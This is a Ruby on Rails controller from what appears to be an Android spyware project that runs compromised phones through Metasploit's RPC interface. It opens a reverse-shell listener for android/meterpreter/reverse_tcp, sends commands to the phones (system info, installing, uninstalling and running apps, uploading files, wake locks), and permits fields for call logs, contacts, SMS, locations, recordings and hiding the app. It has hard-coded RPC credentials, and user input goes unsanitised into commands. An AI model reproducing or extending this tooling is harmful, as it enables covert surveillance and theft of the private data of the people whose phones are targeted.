
class SmartphonesController < InheritedResources::Base

  def dump_sysinfo
    processCommand="sysinfo"
    commandOutput=start_msf_process(processCommand)
    puts commandOutput

    respond_to do |format|
        format.js { render "dump_sysinfo", :locals => {:commandOutput => commandOutput}  }
      end
    end

    def dump_localtime
      processCommand="localtime"
      commandOutput=start_msf_process(processCommand)
      puts commandOutput

      respond_to do |format|
          format.js { render "dump_localtime", :locals => {:commandOutput => commandOutput}  }
        end
    end

    def set_audio_mode
      processCommand="set_audio_mode -m #{params[:sound_mode]}"
      commandOutput=start_msf_process(processCommand)
      puts commandOutput

      respond_to do |format|
          format.js { render "set_audio_mode", :locals => {:commandOutput => commandOutput}  }
        end
    end

    def uninstall_app
      processCommand="app_uninstall #{params[:app_name]}"
      commandOutput=start_msf_process(processCommand)
      puts commandOutput

      respond_to do |format|
          format.js { render "uninstall_app", :locals => {:commandOutput => commandOutput}  }
        end
    end

    def install_app
      processCommand="app_install #{params[:app_name]}"
      commandOutput=start_msf_process(processCommand)
      puts commandOutput

      respond_to do |format|
          format.js { render "install_app", :locals => {:commandOutput => commandOutput}  }
        end
    end

    def list_apps
      processCommand="app_list -#{params[:apps_type]}"
      commandOutput=start_msf_process(processCommand)
      puts commandOutput

      respond_to do |format|
          format.js { render "list_apps", :locals => {:commandOutput => commandOutput}  }
        end
    end

    def open_app
      processCommand="app_run #{params[:app_name]}"
      commandOutput=start_msf_process(processCommand)
      puts commandOutput

      respond_to do |format|
          format.js { render "open_app", :locals => {:commandOutput => commandOutput}  }
        end
    end

    def upload_file
      processCommand="upload #{params[:file_name]}"
      commandOutput=start_msf_process(processCommand)
      puts commandOutput

      respond_to do |format|
          format.js { render "upload_file", :locals => {:commandOutput => commandOutput}  }
        end
    end

    def wake_lock
      processCommand="wakelock #{params[:flag]}"
      commandOutput=start_msf_process(processCommand)
      puts commandOutput

      respond_to do |format|
          format.js { render "wake_lock", :locals => {:commandOutput => commandOutput}  }
        end
    end


    


    def dropdown_list_smartphones
        render locals: {smartphones: smartphones, smartphone:smartphone}
      end

    def select_smartphone
        redirect_to controller: 'admin/dashboard', action: 'index', selected_smartphone_id: params[:smartphone_id]
    end


    def load
        render
    end

    def install
        path = "installsomething.txt"
        content = "data from the form"
        File.open(path, "w+") do |f|
        f.write(content)
        end
    end



    def check_connection
      adbDevices=`C:\\Users\\Costin\\Desktop\\Workspaces\\android-spyware\\tools\\platform-tools\\adb.exe devices`.split("\n")
      adbConnected=adbDevices.size > 1 ? true : false

        require 'msfrpc-client'
        require 'date'
        user = 'cool'
        password = 'looc'
        options = {
          host: '127.0.0.1',
          port: 3333,
          uri:  '/api/',
          ssl:  true
        }
        rpc = Msf::RPC::Client.new(options)
        rpc.login(user, password)
        payloadOptions = {
          'PAYLOAD' => 'android/meterpreter/reverse_tcp',
          'LHOST'   => '0.0.0.0',
          'LPORT'   => 4444
        }
        job = rpc.call('module.execute', 'exploit', 'multi/handler', payloadOptions)
        sessions=rpc.call('session.list')
        msfConnected=sessions.size > 0 ? true : false

      respond_to do |format|
        format.js { render "check_connection", :locals => {:adbConnected => adbConnected, :msfConnected => msfConnected}  }
      end

    end

    

  private

    def smartphone_params
      params.require(:smartphone).permit(:operating_system, :name, :pictures, :screenshots, :videos, :recordings, :is_rooted, :call_logs, :contacts, :sms_messages, :geo_locations, :is_app_hidden)
    end





end
